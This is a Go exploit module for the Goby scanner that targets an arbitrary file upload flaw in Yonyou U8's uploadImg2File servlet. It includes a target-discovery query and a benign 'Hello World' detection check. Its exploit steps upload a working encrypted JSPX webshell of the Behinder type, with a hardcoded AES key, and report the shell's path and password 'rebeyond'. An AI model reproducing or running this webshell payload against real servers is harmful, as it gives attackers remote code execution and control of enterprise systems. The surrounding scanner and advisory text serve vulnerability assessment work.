package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yongyou U8 uploadImg2File Arbitrary File Upload Vulnerability",
    "Description": "<p>Yonyou U8 is an enterprise Internet management platform of Yonyou Network Technology Co., LTD., which integrates fine management, industrial chain coordination and social operation for growing enterprises.</p><p>Yongyou U8 uploadImg2File has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Yonyou U8",
    "Homepage": "https://hc.yonyou.com",
    "DisclosureDate": "2022-07-12",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
    "GobyQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
    "Level": "3",
    "Impact": "<p>Yongyou U8 uploadImg2File has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://hc.yonyou.com\">https://hc.yonyou.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/hrss/servlet/uploadImg2File",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/hrss/servlet/uploadImg2File",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT5rj6tqbSlxt3r5F"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"x\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"y\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"w\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"h\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"txtFileName\"; filename=\"test.jspx\"\nContent-Type: image/png\n\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">\n<title>JSP - Hello World Tutorial - Programmer Gate</title>\n</head>\n<body>\n<%= \"Hello World!\" %>\n</body>\n</html></jsp:root>\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastheader|regex|/uploads/(.*?)&"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/hrss/uploads/{{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Hello World",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/hrss/servlet/uploadImg2File",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/hrss/servlet/uploadImg2File",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT5rj6tqbSlxt3r5F"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"x\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"y\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"w\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"h\"\n\n\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F\nContent-Disposition: form-data; name=\"txtFileName\"; filename=\"test.jspx\"\nContent-Type: image/png\n\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>\n------WebKitFormBoundaryT5rj6tqbSlxt3r5F--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastheader|regex|/uploads/(.*?)&"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/hrss/uploads/{{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|Webshell Addr: /hrss/uploads/{{{filename}}} \\nWebshell Pass: rebeyond\\nUse Behinder to connect"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "用友U8 uploadImg2File 任意文件上传",
            "Product": "用友U8",
            "Description": "<p>用友U8+ 是用友网络科技股份有限公司旗下一款成长型企业构建精细管理、产业链协同、社交化运营为一体的企业互联网经营管理平台。<br></p><p>用友U8 uploadImg2File 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://hc.yonyou.com\">https://hc.yonyou.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友U8 uploadImg2File 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yongyou U8 uploadImg2File Arbitrary File Upload Vulnerability",
            "Product": "Yonyou U8",
            "Description": "<p>Yonyou U8 is an enterprise Internet management platform of Yonyou Network Technology Co., LTD., which integrates fine management, industrial chain coordination and social operation for growing enterprises.<br></p><p>Yongyou U8 uploadImg2File has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://hc.yonyou.com\">https://hc.yonyou.com</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Yongyou U8 uploadImg2File has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
